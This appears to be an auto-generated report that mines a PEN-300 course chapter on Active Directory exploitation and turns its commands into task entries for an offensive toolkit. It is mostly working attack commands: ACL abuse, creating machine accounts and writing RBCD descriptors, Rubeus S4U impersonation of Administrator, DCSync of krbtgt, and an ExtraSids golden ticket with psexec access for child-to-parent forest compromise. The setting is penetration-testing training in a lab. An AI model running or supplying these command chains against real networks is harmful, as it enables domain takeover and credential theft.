# PEN-300 Chapter 16 Mining Report: AD Permissions & Delegation

**Date:** 2025-10-08
**Source:** `/crack/.references/pen-300-chapters/chapter_16.txt` (6,261 lines)
**Chapter:** 16 - Active Directory Exploitation
**Agent:** CrackPot v1.0

---

## Executive Summary

Chapter 16 is the **second-largest PEN-300 chapter** covering advanced AD exploitation focusing on:
- **AD Object Security Permissions** (ACL enumeration & abuse)
- **Kerberos Delegation** (Unconstrained, Constrained, RBCD)
- **Forest Trusts** (Cross-domain enumeration & attacks)

**Key Finding:** The chapter contains **extensive manual LDAP-based enumeration techniques** that complement the existing PowerView commands already documented in `ad_attacks.py`, `ad_persistence.py`, and `ad_enumeration.py`.

**Recommendation:** Focus on **MANUAL/TOOL-LESS enumeration alternatives** and **novel delegation discovery commands** rather than duplicating existing PowerView coverage.

---

## Section 1: Existing Coverage Analysis

### 1.1 Commands ALREADY in CRACK Track Plugins

| Command/Technique | Existing Plugin | Line(s) in Plugin | Coverage Quality |
|-------------------|-----------------|-------------------|------------------|
| `Get-ObjectAcl -Identity <user>` | `ad_persistence.py` | 89-122 | ✅ **Excellent** - ACL enumeration for GenericAll |
| `Get-DomainUser -TrustedToAuth` | `ad_attacks.py` | 641-673 | ✅ **Excellent** - Constrained delegation enum |
| `Get-DomainComputer -Unconstrained` | `ad_attacks.py` | 648-673 | ✅ **Excellent** - Unconstrained delegation enum |
| `Get-DomainTrust -API` | N/A | N/A | ❌ **MISSING** - Forest trust enumeration |
| `ConvertFrom-SID` | `ad_enumeration.py` | 108-120 | ✅ **Good** - SID resolution |
| `Add-DomainObjectAcl -Rights DCSync` | `ad_attacks.py` | 601-627 | ✅ **Excellent** - DCSync persistence |
| `Get-DomainUser | Get-ObjectAcl` | `ad_persistence.py` | 264-289 | ✅ **Excellent** - GenericAll enumeration |
| `Get-DomainGroup | Get-ObjectAcl` | `ad_persistence.py` | 336-360 | ✅ **Excellent** - Group ACL enumeration |

**Conclusion:** Core PowerView commands are **well-documented**. Gap analysis reveals:
- ✅ ACL abuse (GenericAll, WriteDACL, WriteOwner) - **COVERED**
- ✅ Basic delegation enumeration - **COVERED**
- ❌ **Manual LDAP alternatives** - **MISSING**
- ❌ **Forest trust enumeration** (Get-DomainTrust variations) - **MISSING**
- ❌ **RBCD manual setup** (New-MachineAccount, msDS-AllowedToActOnBehalfOfOtherIdentity) - **MISSING**
- ❌ **Cross-domain enumeration** (Get-DomainUser -Domain) - **MISSING**

---

## Section 2: Novel Commands for Extraction

### 2.1 Manual ACL Enumeration (Tool-Less Alternatives)

**Page 609, Line 133:**
```powershell
Get-ObjectAcl -Identity offsec -ResolveGUIDs | Foreach-Object {$_ | Add-Member -NotePropertyName Identity -NotePropertyValue (ConvertFrom-SID $_.SecurityIdentifier.value) -Force; $_}
```

**OSCP Value:** Manual SID resolution without PowerView's automatic translation

**Flag Explanations:**
- `-Identity offsec`: Target AD object (user, group, computer, OU, domain)
- `-ResolveGUIDs`: Translate GUID-based permissions to human-readable names (e.g., `WriteProperty`)
- `Add-Member -NotePropertyName Identity`: Append resolved identity to each ACE for filtering
- `ConvertFrom-SID $_.SecurityIdentifier.value`: Convert SID to DOMAIN\username format

**Success Indicators:**
- ACEs displayed with `ActiveDirectoryRights` (GenericAll, WriteDACL, WriteOwner, etc.)
- `Identity` field shows resolved username/group (not raw SID)
- Can filter by current user: `if ($_.Identity -eq $("$env:UserDomain\$env:Username"))`

**Manual Alternative (LDAP-based):**
```powershell
# Direct LDAP query without PowerView
$searcher = [ADSISearcher]"(samaccountname=offsec)"
$user = $searcher.FindOne()
$acl = $user.Properties["ntsecuritydescriptor"][0]
$acl.Access | Select IdentityReference, ActiveDirectoryRights
```

---

### 2.2 Forest Trust Enumeration (Multi-Method)

**Page 642, Lines 2247-2251:**
```powershell
# Method 1: Win32 API (DsEnumerateDomainTrusts)
Get-DomainTrust -API

# Method 2: .NET (System.DirectoryServices.ActiveDirectory)
([System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain()).GetAllTrustRelationships()

# Method 3: LDAP (Query Trusted Domain Objects)
Get-DomainTrust  # Default LDAP method
```

**OSCP Value:** **Tool-agnostic trust discovery** - if PowerView fails, use .NET or LDAP directly

**Command 1: Win32 API Enumeration**
```powershell
Get-DomainTrust -API
```

**Flag Explanations:**
- `-API`: Use Win32 `DsEnumerateDomainTrusts` API (low-level system call)

**Success Indicators:**
- `Flags: IN_FOREST, DIRECT_OUTBOUND, TREE_ROOT, DIRECT_INBOUND` (bi-directional forest trust)
- `TrustType: UPLEVEL` (Active Directory forest trust)
- `TrustAttributes: WITHIN_FOREST` (intra-forest trust, SID filtering disabled)
- `TargetSid` shown (use for ExtraSids golden ticket attacks)

**Manual Alternative (.NET):**
```powershell
# Pure .NET - works without PowerView
[System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain().GetAllTrustRelationships()
```

**Output Format:**
```
SourceName      TargetName   TrustType   TrustDirection
----------      ----------   ---------   --------------
prod.corp1.com  corp1.com    ParentChild Bidirectional
```

**Flag Explanations (.NET):**
- `GetCurrentDomain()`: Get current AD domain object
- `GetAllTrustRelationships()`: Enumerate all trusts (parent-child, forest, external)

**Success Indicators:**
- `TrustType: ParentChild` (child → parent domain trust)
- `TrustDirection: Bidirectional` (two-way authentication)

**Manual Alternative (LDAP):**
```powershell
Get-DomainTrust  # Default LDAP query method
```

**Output:**
```
TrustAttributes : WITHIN_FOREST
TrustDirection  : Bidirectional
WhenCreated     : 4/2/2020 2:08:22 PM
```

**OSCP Exam Scenario:**
If PowerView is blocked/missing, use **pure .NET** method:
```powershell
$domain = [System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain()
$domain.GetAllTrustRelationships() | Format-Table -AutoSize
```

---

### 2.3 Constrained Delegation Discovery

**Page 627, Line 1286:**
```powershell
Get-DomainUser -TrustedToAuth
```

**Flag Explanations:**
- `-TrustedToAuth`: Filter for `TRUSTED_TO_AUTH_FOR_DELEGATION` in `userAccountControl` attribute
- Identifies accounts that can perform **S4U2Self** (protocol transition)

**Success Indicators:**
- `msds-allowedtodelegateto`: Array of SPNs delegation is allowed to (e.g., `MSSQLSvc/CDC01:1433`)
- `useraccountcontrol: TRUSTED_TO_AUTH_FOR_DELEGATION` (allows NTLM → Kerberos transition)
- `serviceprincipalname: HTTP/web` (frontend service SPN)

**Exploitation Path:**
1. **Compromise account** → Get NTLM hash
2. **Request TGT:** `Rubeus.exe asktgt /user:iissvc /rc4:<hash>`
3. **S4U2Self + S4U2Proxy:** `Rubeus.exe s4u /ticket:<TGT> /impersonateuser:Administrator /msdsspn:MSSQLSvc/CDC01:1433 /ptt`
4. **Code execution** on backend service (MSSQL, CIFS, LDAP, etc.)

**Manual Alternative (LDAP filter):**
```powershell
# Direct LDAP query without PowerView
$searcher = [ADSISearcher]"(&(objectCategory=user)(userAccountControl:1.2.840.113556.1.4.803:=16777216))"
$searcher.FindAll() | Select -ExpandProperty Properties | Select samaccountname, msds-allowedtodelegateto
```

**Flag Explanation:**
- `userAccountControl:1.2.840.113556.1.4.803:=16777216`: Bitwise AND for `TRUSTED_TO_AUTH_FOR_DELEGATION` flag

---

### 2.4 Resource-Based Constrained Delegation (RBCD) Setup

**Page 634, Lines 1741-1769:**
```powershell
# Step 1: Create computer account
. .\powermad.ps1
New-MachineAccount -MachineAccount myComputer -Password $(ConvertTo-SecureString 'h4x' -AsPlainText -Force)

# Step 2: Verify creation
Get-DomainComputer -Identity myComputer
```

**OSCP Value:** **Manual RBCD exploitation** without pre-existing computer accounts

**Flag Explanations (New-MachineAccount):**
- `-MachineAccount myComputer`: Name of computer account to create (must be unique)
- `-Password $(ConvertTo-SecureString ...)`: Set computer account password (SecureString format required)
- `ConvertTo-SecureString 'h4x' -AsPlainText -Force`: Convert plaintext password to SecureString

**Success Indicators:**
- `[+] Machine account myComputer added`
- `serviceprincipalname: {RestrictedKrbHost/myComputer, HOST/myComputer, ...}` (SPNs auto-created)
- `distinguishedname: CN=myComputer,CN=Computers,DC=prod,DC=corp1,DC=com`

**Prerequisite Check:**
```powershell
# Verify ms-DS-MachineAccountQuota (default: 10)
Get-DomainObject -Identity prod -Properties ms-DS-MachineAccountQuota
```

**Output:**
```
ms-ds-machineaccountquota
-------------------------
10
```

**Manual Alternative (without Powermad):**
```powershell
# .NET method to add computer account
$computer = New-Object System.DirectoryServices.DirectoryEntry("LDAP://CN=Computers,DC=prod,DC=corp1,DC=com")
$newComputer = $computer.Children.Add("CN=myComputer", "computer")
$newComputer.CommitChanges()
```

---

### 2.5 RBCD Exploitation (msDS-AllowedToActOnBehalfOfOtherIdentity)

**Page 635, Lines 1793-1850:**
```powershell
# Step 1: Get SID of created computer account
$sid = Get-DomainComputer -Identity myComputer -Properties objectsid | Select -ExpandProperty objectsid

# Step 2: Create security descriptor with computer SID
$SD = New-Object Security.AccessControl.RawSecurityDescriptor -ArgumentList "O:BAD:(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;$sid)"
$SDBytes = New-Object byte[] ($SD.BinaryLength)
$SD.GetBinaryForm($SDBytes, 0)

# Step 3: Write to target's msDS-AllowedToActOnBehalfOfOtherIdentity
Get-DomainComputer appsrv01 | Set-DomainObject -Set @{'msds-allowedtoactonbehalfofotheridentity'=$SDBytes}

# Step 4: Verify RBCD configuration
$RBCDbytes = Get-DomainComputer appsrv01 -Properties 'msds-allowedtoactonbehalfofotheridentity' | Select -ExpandProperty msds-allowedtoactonbehalfofotheridentity
$Descriptor = New-Object Security.AccessControl.RawSecurityDescriptor -ArgumentList $RBCDbytes, 0
$Descriptor.DiscretionaryAcl

# Step 5: Abuse RBCD with Rubeus
Rubeus.exe s4u /user:myComputer$ /rc4:<hash> /impersonateuser:Administrator /msdsspn:cifs/appsrv01 /ptt
```

**OSCP Value:** **GenericWrite → Code Execution** on computer accounts (novel attack chain)

**Flag Explanations (Security Descriptor Creation):**
- `New-Object Security.AccessControl.RawSecurityDescriptor`: Create binary security descriptor
- `"O:BAD:(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;$sid)"`: SDDL string with target SID
  - `O:BA`: Owner = Built-in Administrators
  - `D:(A;;...;;;$sid)`: DACL with ALLOW ACE for computer SID
  - `CCDCLCSWRPWPDTLOCRSDRCWDWO`: Full control rights
- `$SD.GetBinaryForm($SDBytes, 0)`: Convert SDDL to binary format for LDAP write

**Flag Explanations (Set-DomainObject):**
- `-Set @{'msds-allowedtoactonbehalfofotheridentity'=$SDBytes}`: Write binary security descriptor to target computer's RBCD property
- Target: Computer you have `GenericWrite` or `WriteDACL` on

**Success Indicators:**
- `$Descriptor.DiscretionaryAcl` shows ACE with your computer's SID
- `ConvertFrom-SID` translates SID back to `PROD\myComputer$`

**Manual Alternative (Impacket rbcd.py):**
```bash
# Linux alternative with Impacket
rbcd.py -action write -delegate-from 'myComputer$' -delegate-to 'appsrv01$' -dc-ip <DC> 'prod.corp1.com'/'dave':'password'
```

---

### 2.6 Cross-Domain Enumeration

**Page 644, Line 2329:**
```powershell
Get-DomainUser -Domain corp1.com
```

**OSCP Value:** **Enumerate trusted domains** without requiring access to their DCs

**Flag Explanations:**
- `-Domain corp1.com`: Target domain FQDN (must have trust relationship with current domain)

**Success Indicators:**
- User objects from `corp1.com` enumerated while authenticated to `prod.corp1.com`
- `memberof: CN=Enterprise Admins,CN=Users,DC=corp1,DC=com` (high-value targets in root domain)

**How It Works:**
- PowerView initializes `DirectorySearcher` with LDAP path: `LDAP://RDC01.corp1.com/DC=corp1,DC=com`
- Kerberos cross-domain authentication uses trust key (transparent to user)

**Manual Alternative (.NET):**
```powershell
# Direct .NET DirectorySearcher targeting trusted domain
$domain = New-Object System.DirectoryServices.DirectoryEntry("LDAP://corp1.com")
$searcher = New-Object System.DirectoryServices.DirectorySearcher($domain)
$searcher.Filter = "(objectClass=user)"
$searcher.FindAll() | Select -ExpandProperty Properties | Select samaccountname, memberof
```

**Additional Cross-Domain Commands:**
```powershell
Get-DomainGroup -Domain corp1.com
Get-DomainComputer -Domain corp1.com
Get-DomainGPO -Domain corp1.com
Get-DomainTrust -Domain corp1.com  # Enumerate trusts from other domain
```

---

### 2.7 Forest Compromise Techniques

**Page 648, Lines 2599-2656: DCSync for krbtgt + Golden Ticket with ExtraSids**

**Step 1: DCSync krbtgt hash**
```powershell
lsadump::dcsync /domain:prod.corp1.com /user:prod\krbtgt
```

**Success Indicators:**
- `Hash NTLM: 4b6af2bf64714682eeef64f516a08949`

**Step 2: Get Domain SIDs**
```powershell
Get-DomainSID -Domain prod.corp1.com  # Child domain SID
Get-DomainSID -Domain corp1.com       # Parent domain SID
```

**Output:**
```
S-1-5-21-3776646582-2086779273-4091361643  # prod.corp1.com
S-1-5-21-1095350385-1831131555-2412080359  # corp1.com
```

**Step 3: Craft Golden Ticket with Enterprise Admins SID**
```powershell
kerberos::golden /user:h4x /domain:prod.corp1.com /sid:S-1-5-21-3776646582-2086779273-4091361643 /krbtgt:4b6af2bf64714682eeef64f516a08949 /sids:S-1-5-21-1095350385-1831131555-2412080359-519 /ptt
```

**Flag Explanations:**
- `/user:h4x`: Fake username (can be any value, doesn't need to exist)
- `/domain:prod.corp1.com`: Origin domain (child domain)
- `/sid:S-1-5-21-...`: Child domain SID
- `/krbtgt:<hash>`: Child domain krbtgt NTLM hash
- `/sids:S-1-5-21-...-519`: **ExtraSids** with Enterprise Admins SID (parent domain SID + `-519`)
  - `-519`: RID for Enterprise Admins (forest-wide group)
- `/ptt`: Pass-the-Ticket (inject into current session)

**Success Indicators:**
- `Extra SIDs: S-1-5-21-1095350385-1831131555-2412080359-519 ;`
- `Golden ticket for 'h4x @ prod.corp1.com' successfully submitted`
- Can access root domain DC: `dir \\rdc01.corp1.com\C$` (works)
- `whoami /groups` shows: `CORP1\Enterprise Admins Group`

**OSCP Value:** **Child → Parent domain escalation** without needing trust key

**Manual Alternative (Linux - Impacket ticketer.py):**
```bash
ticketer.py -nthash <krbtgt_hash> -domain prod.corp1.com -domain-sid S-1-5-21-3776646582-2086779273-4091361643 -extra-sid S-1-5-21-1095350385-1831131555-2412080359-519 h4x
export KRB5CCNAME=h4x.ccache
psexec.py prod.corp1.com/h4x@rdc01.corp1.com -k -no-pass
```

---

## Section 3: Gap Analysis & Recommendations

### 3.1 Commands to ADD (High Priority)

| Command/Technique | Target Plugin | Reason |
|-------------------|---------------|--------|
| `Get-DomainTrust -API / -NET / LDAP` | `ad_enumeration.py` | ❌ **MISSING** - Forest trust discovery (3 methods) |
| Manual LDAP ACL queries (ADSISearcher) | `ad_enumeration.py` | ❌ **MISSING** - Tool-less alternative |
| `New-MachineAccount` (Powermad) | `ad_attacks.py` | ❌ **MISSING** - RBCD prerequisite |
| RBCD security descriptor setup | `ad_persistence.py` | ❌ **MISSING** - GenericWrite → Code execution |
| `Get-DomainUser -Domain <trust>` | `ad_enumeration.py` | ❌ **MISSING** - Cross-domain enumeration |
| Golden ticket with ExtraSids | `ad_attacks.py` | ⚠️ **PARTIAL** - Basic golden ticket exists, but no ExtraSids variant |
| Trust key DCSync (`/user:corp1$`) | `ad_attacks.py` | ❌ **MISSING** - Alternative to krbtgt for cross-domain |
| `.NET DirectorySearcher` manual queries | `ad_enumeration.py` | ❌ **MISSING** - PowerView alternatives |

### 3.2 Commands to SKIP (Already Covered)

| Command | Existing Location | Reason |
|---------|-------------------|--------|
| `Get-ObjectAcl -Identity <user>` | `ad_persistence.py:89` | ✅ Fully documented |
| `Get-DomainUser \| Get-ObjectAcl` | `ad_persistence.py:264` | ✅ Fully documented |
| `Add-DomainObjectAcl -Rights All` | `ad_persistence.py:245` | ✅ Fully documented |
| `Get-DomainUser -TrustedToAuth` | `ad_attacks.py:641` | ✅ Fully documented |
| `Get-DomainComputer -Unconstrained` | `ad_attacks.py:648` | ✅ Fully documented |
| `ConvertFrom-SID` | `ad_enumeration.py:108` | ✅ Already used |
| Basic Rubeus S4U commands | `ad_attacks.py:675` | ✅ Constrained delegation covered |

---

## Section 4: Recommended Plugin Enhancements

### 4.1 Target: `ad_enumeration.py`

**New Tasks to Add:**

**Task 1: Forest Trust Enumeration (Multi-Method)**
```python
{
    'id': 'ad-trust-enum-multi',
    'name': 'Forest Trust Enumeration (3 Methods)',
    'type': 'parent',
    'children': [
        {
            'id': 'trust-enum-api',
            'name': 'Enumerate Trusts via Win32 API',
            'type': 'command',
            'metadata': {
                'command': 'Get-DomainTrust -API',
                'description': 'Use DsEnumerateDomainTrusts Win32 API for trust discovery',
                'tags': ['OSCP:HIGH', 'ENUM', 'QUICK_WIN'],
                'flag_explanations': {
                    '-API': 'Use Win32 DsEnumerateDomainTrusts API (low-level system call)'
                },
                'success_indicators': [
                    'Flags: IN_FOREST, DIRECT_OUTBOUND, TREE_ROOT, DIRECT_INBOUND (bi-directional)',
                    'TrustType: UPLEVEL (Active Directory trust)',
                    'TrustAttributes: WITHIN_FOREST (SID filtering disabled)',
                    'TargetSid shown (for ExtraSids golden ticket)'
                ],
                'failure_indicators': [
                    'Access denied - need domain user authentication',
                    'PowerView not loaded'
                ],
                'next_steps': [
                    'Enumerate users in trusted domain: Get-DomainUser -Domain <trust>',
                    'Search for Enterprise Admins in root domain',
                    'Plan cross-domain attack path'
                ],
                'alternatives': [
                    '.NET: ([System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain()).GetAllTrustRelationships()',
                    'LDAP: Get-DomainTrust (default method)',
                    'Windows CLI: nltest /domain_trusts'
                ],
                'notes': 'WITHIN_FOREST trusts have SID filtering disabled by default. Plan ExtraSids golden ticket for child → parent domain escalation'
            }
        },
        {
            'id': 'trust-enum-dotnet',
            'name': 'Enumerate Trusts via .NET (PowerView-Free)',
            'type': 'command',
            'metadata': {
                'command': '([System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain()).GetAllTrustRelationships()',
                'description': 'Pure .NET trust enumeration (works without PowerView)',
                'tags': ['OSCP:HIGH', 'ENUM', 'MANUAL'],
                'flag_explanations': {
                    'GetCurrentDomain()': 'Get current AD domain object',
                    'GetAllTrustRelationships()': 'Enumerate all trusts (parent-child, forest, external)'
                },
                'success_indicators': [
                    'TrustType: ParentChild (child → parent domain)',
                    'TrustDirection: Bidirectional (two-way authentication)'
                ],
                'failure_indicators': [
                    'Access denied - need domain authentication',
                    '.NET framework not available'
                ],
                'alternatives': [
                    'Get-DomainTrust -API (PowerView with Win32)',
                    'Get-DomainTrust (PowerView with LDAP)',
                    'nltest /domain_trusts /all_trusts'
                ],
                'notes': 'Preferred method if PowerView blocked/unavailable. Pure .NET - no external dependencies'
            }
        }
    ]
}
```

**Task 2: Cross-Domain Enumeration**
```python
{
    'id': 'cross-domain-enum',
    'name': 'Cross-Domain Enumeration',
    'type': 'parent',
    'children': [
        {
            'id': 'cross-domain-users',
            'name': 'Enumerate Users in Trusted Domain',
            'type': 'command',
            'metadata': {
                'command': 'Get-DomainUser -Domain <TRUSTED_DOMAIN>',
                'description': 'Enumerate users in trusted domain without needing access to their DC',
                'tags': ['OSCP:HIGH', 'ENUM', 'CROSS_DOMAIN'],
                'flag_explanations': {
                    '-Domain': 'Target domain FQDN (must have trust with current domain)'
                },
                'success_indicators': [
                    'User objects from trusted domain enumerated',
                    'memberof shows Enterprise Admins (high-value targets)',
                    'Can enumerate while authenticated to different domain'
                ],
                'failure_indicators': [
                    'No trust relationship exists',
                    'LDAP query timeout',
                    'Authentication failed'
                ],
                'next_steps': [
                    'Identify Enterprise Admins in root domain',
                    'Search for Kerberoastable users: Get-DomainUser -Domain <trust> -SPN',
                    'Enumerate groups: Get-DomainGroup -Domain <trust>',
                    'Check for delegation: Get-DomainUser -Domain <trust> -TrustedToAuth'
                ],
                'alternatives': [
                    '.NET DirectorySearcher: $domain = New-Object System.DirectoryServices.DirectoryEntry("LDAP://<trust>"); $searcher = New-Object System.DirectoryServices.DirectorySearcher($domain)',
                    'BloodHound ingestor with cross-domain collection'
                ],
                'notes': 'PowerView uses DirectorySearcher with LDAP://<trust_dc>. Kerberos handles cross-domain auth transparently'
            }
        }
    ]
}
```

---

### 4.2 Target: `ad_attacks.py`

**New Tasks to Add:**

**Task 1: RBCD Exploitation Chain**
```python
{
    'id': 'rbcd-exploitation',
    'name': 'Resource-Based Constrained Delegation (RBCD) Exploitation',
    'type': 'parent',
    'children': [
        {
            'id': 'rbcd-check-quota',
            'name': 'Check Machine Account Quota',
            'type': 'command',
            'metadata': {
                'command': 'Get-DomainObject -Identity <domain> -Properties ms-DS-MachineAccountQuota',
                'description': 'Verify if you can create computer accounts (default: 10)',
                'tags': ['OSCP:HIGH', 'ENUM', 'RBCD'],
                'flag_explanations': {
                    '-Identity': 'Domain object (e.g., "prod" or "DC=prod,DC=corp1,DC=com")',
                    '-Properties ms-DS-MachineAccountQuota': 'Query computer account creation quota'
                },
                'success_indicators': [
                    'ms-ds-machineaccountquota: 10 (default)',
                    'Non-zero value means you can create computer accounts'
                ],
                'failure_indicators': [
                    'Quota is 0 (disabled)',
                    'Access denied'
                ],
                'next_steps': [
                    'Create computer account with Powermad: New-MachineAccount',
                    'Enumerate targets with GenericWrite on computers'
                ],
                'alternatives': [
                    'Manual LDAP query: ldapsearch -h <DC> -b "DC=domain,DC=local" "(objectClass=domain)" ms-DS-MachineAccountQuota'
                ],
                'notes': 'Default quota allows ANY authenticated user to add 10 computer accounts. Critical for RBCD attacks'
            }
        },
        {
            'id': 'rbcd-create-computer',
            'name': 'Create Computer Account (Powermad)',
            'type': 'command',
            'metadata': {
                'command': '. .\\powermad.ps1; New-MachineAccount -MachineAccount myComputer -Password $(ConvertTo-SecureString "h4x" -AsPlainText -Force)',
                'description': 'Create computer account for RBCD attack (requires ms-DS-MachineAccountQuota > 0)',
                'tags': ['OSCP:HIGH', 'RBCD', 'EXPLOIT'],
                'flag_explanations': {
                    'New-MachineAccount': 'Powermad function to create computer account',
                    '-MachineAccount': 'Name of computer to create (must be unique)',
                    '-Password': 'Computer account password (SecureString format)',
                    'ConvertTo-SecureString': 'Convert plaintext to SecureString',
                    '-AsPlainText -Force': 'Allow plaintext input without confirmation'
                },
                'success_indicators': [
                    '[+] Machine account myComputer added',
                    'Get-DomainComputer -Identity myComputer shows serviceprincipalname',
                    'SPNs auto-created: RestrictedKrbHost/myComputer, HOST/myComputer'
                ],
                'failure_indicators': [
                    'Quota exceeded (already created 10 computers)',
                    'Computer name already exists',
                    'Access denied'
                ],
                'next_steps': [
                    'Get SID: $sid = Get-DomainComputer -Identity myComputer -Properties objectsid',
                    'Create security descriptor for msDS-AllowedToActOnBehalfOfOtherIdentity',
                    'Write to target computer with GenericWrite'
                ],
                'alternatives': [
                    'Impacket addcomputer.py: addcomputer.py -computer-name myComputer$ -computer-pass h4x domain/user:pass',
                    '.NET DirectoryEntry: $computer = New-Object System.DirectoryServices.DirectoryEntry(...); $newComputer = $computer.Children.Add("CN=myComputer", "computer")'
                ],
                'notes': 'Download Powermad: https://github.com/Kevin-Robertson/Powermad. Computer account requires SPN for RBCD (auto-set on creation)'
            }
        },
        {
            'id': 'rbcd-configure',
            'name': 'Configure RBCD (Write msDS-AllowedToActOnBehalfOfOtherIdentity)',
            'type': 'command',
            'metadata': {
                'command': '''$sid = Get-DomainComputer -Identity myComputer -Properties objectsid | Select -ExpandProperty objectsid
$SD = New-Object Security.AccessControl.RawSecurityDescriptor -ArgumentList "O:BAD:(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;$sid)"
$SDBytes = New-Object byte[] ($SD.BinaryLength)
$SD.GetBinaryForm($SDBytes, 0)
Get-DomainComputer <TARGET> | Set-DomainObject -Set @{'msds-allowedtoactonbehalfofotheridentity'=$SDBytes}''',
                'description': 'Write RBCD configuration to target computer (requires GenericWrite/WriteDACL)',
                'tags': ['OSCP:HIGH', 'RBCD', 'PERSISTENCE'],
                'flag_explanations': {
                    'Get-DomainComputer -Properties objectsid': 'Get SID of created computer account',
                    'New-Object Security.AccessControl.RawSecurityDescriptor': 'Create binary security descriptor',
                    '"O:BAD:(A;;...;;;$sid)"': 'SDDL string - Owner:BA (Admins), ACE with full control for computer SID',
                    '$SD.GetBinaryForm($SDBytes, 0)': 'Convert SDDL to binary format for LDAP',
                    'Set-DomainObject -Set @{...}': 'Write binary descriptor to target computer\'s RBCD property'
                },
                'success_indicators': [
                    'No error from Set-DomainObject',
                    'Verify: Get-DomainComputer <TARGET> -Properties msds-allowedtoactonbehalfofotheridentity',
                    '$Descriptor.DiscretionaryAcl shows ACE with myComputer$ SID'
                ],
                'failure_indicators': [
                    'Access denied - need GenericWrite/WriteDACL on target',
                    'Target is protected (AdminSDHolder)',
                    'RBCD not supported (pre-2012 domain functional level)'
                ],
                'next_steps': [
                    'Get computer hash: Rubeus.exe hash /password:h4x /user:myComputer$ /domain:<domain>',
                    'Request TGT: Rubeus.exe asktgt /user:myComputer$ /rc4:<hash>',
                    'S4U attack: Rubeus.exe s4u /ticket:<TGT> /impersonateuser:Administrator /msdsspn:cifs/<TARGET> /ptt',
                    'Access target: dir \\\\<TARGET>\\C$'
                ],
                'alternatives': [
                    'Impacket rbcd.py: rbcd.py -action write -delegate-from myComputer$ -delegate-to TARGET$ domain/user:pass',
                    'StandIn RBCD: StandIn.exe --computer <TARGET> --sid S-1-5-21-...'
                ],
                'notes': 'GenericWrite on computer → code execution. Only known method to exploit GenericWrite on computers. Requires Server 2012+ domain functional level'
            }
        }
    ]
}
```

**Task 2: Golden Ticket with ExtraSids (Forest Compromise)**
```python
{
    'id': 'golden-ticket-extrasids',
    'name': 'Golden Ticket with ExtraSids (Child → Parent Domain Escalation)',
    'type': 'parent',
    'children': [
        {
            'id': 'extrasids-get-domain-sids',
            'name': 'Get Domain SIDs (Child + Parent)',
            'type': 'command',
            'metadata': {
                'command': '''Get-DomainSID -Domain prod.corp1.com
Get-DomainSID -Domain corp1.com''',
                'description': 'Get SIDs for both child and parent domains (required for ExtraSids)',
                'tags': ['OSCP:HIGH', 'ENUM', 'FOREST'],
                'flag_explanations': {
                    '-Domain prod.corp1.com': 'Child domain (current compromised domain)',
                    '-Domain corp1.com': 'Parent/root domain (target for escalation)'
                },
                'success_indicators': [
                    'Child SID: S-1-5-21-3776646582-2086779273-4091361643',
                    'Parent SID: S-1-5-21-1095350385-1831131555-2412080359',
                    'Both SIDs retrieved successfully'
                ],
                'next_steps': [
                    'Append "-519" to parent SID for Enterprise Admins: S-1-5-21-...-519',
                    'DCSync child domain krbtgt: lsadump::dcsync /user:prod\\krbtgt',
                    'Craft golden ticket with /sids parameter'
                ],
                'alternatives': [
                    'whoami /user (shows your user SID, remove RID to get domain SID)',
                    'Get-ADDomain | Select DistinguishedName, DomainSID'
                ],
                'notes': 'RID 519 = Enterprise Admins (forest-wide admin group). RID 512 = Domain Admins (domain-specific)'
            }
        },
        {
            'id': 'extrasids-golden-ticket',
            'name': 'Craft Golden Ticket with Enterprise Admins SID',
            'type': 'command',
            'metadata': {
                'command': '''kerberos::golden /user:h4x /domain:prod.corp1.com /sid:S-1-5-21-3776646582-2086779273-4091361643 /krbtgt:<CHILD_KRBTGT_HASH> /sids:S-1-5-21-1095350385-1831131555-2412080359-519 /ptt''',
                'description': 'Create golden ticket with ExtraSids for Enterprise Admins (child → parent escalation)',
                'tags': ['OSCP:HIGH', 'KERBEROS', 'FOREST', 'PERSISTENCE'],
                'flag_explanations': {
                    '/user:h4x': 'Fake username (can be any value, does not need to exist)',
                    '/domain:prod.corp1.com': 'Origin domain (child domain)',
                    '/sid:S-1-5-21-...': 'Child domain SID',
                    '/krbtgt:<hash>': 'Child domain krbtgt NTLM hash (from DCSync)',
                    '/sids:S-1-5-21-...-519': 'ExtraSids - Parent domain Enterprise Admins SID',
                    '-519': 'RID for Enterprise Admins (forest-wide group)',
                    '/ptt': 'Pass-the-Ticket (inject into current session)'
                },
                'success_indicators': [
                    'Extra SIDs: S-1-5-21-...-519 ;',
                    'Golden ticket successfully submitted',
                    'Can access root DC: dir \\\\rdc01.corp1.com\\C$',
                    'whoami /groups shows: CORP1\\Enterprise Admins Group'
                ],
                'failure_indicators': [
                    'Access denied to parent domain resources',
                    'Invalid krbtgt hash',
                    'Wrong domain SIDs',
                    'Netdom quarantine enabled (ExtraSids filtered)'
                ],
                'next_steps': [
                    'Access root DC: PsExec.exe \\\\rdc01.corp1.com cmd',
                    'DCSync root domain: lsadump::dcsync /domain:corp1.com /user:krbtgt',
                    'Dump all Enterprise Admins: Get-DomainGroupMember -Identity "Enterprise Admins" -Domain corp1.com',
                    'Complete forest compromise'
                ],
                'alternatives': [
                    'Linux (Impacket): ticketer.py -nthash <krbtgt> -domain prod.corp1.com -domain-sid <child_sid> -extra-sid <parent_sid>-519 h4x',
                    'Export ticket: export KRB5CCNAME=h4x.ccache',
                    'Use ticket: psexec.py prod.corp1.com/h4x@rdc01.corp1.com -k -no-pass'
                ],
                'notes': 'Bypass: Netdom quarantine can block ExtraSids but is rarely enabled. Domain compromise → Forest compromise by design (Microsoft: domains are NOT security boundaries)'
            }
        }
    ]
}
```

---

## Section 5: Duplicate Prevention Summary

### 5.1 PowerView Commands ALREADY Covered (Don't Duplicate)

✅ `Get-ObjectAcl -Identity <user>` → `ad_persistence.py:89`
✅ `Get-DomainUser | Get-ObjectAcl` → `ad_persistence.py:264`
✅ `Get-DomainGroup | Get-ObjectAcl` → `ad_persistence.py:336`
✅ `Add-DomainObjectAcl -Rights All` → `ad_persistence.py:245`
✅ `ConvertFrom-SID` → `ad_enumeration.py:108`
✅ `Get-DomainUser -TrustedToAuth` → `ad_attacks.py:641` (Constrained delegation)
✅ `Get-DomainComputer -Unconstrained` → `ad_attacks.py:648` (Unconstrained delegation)
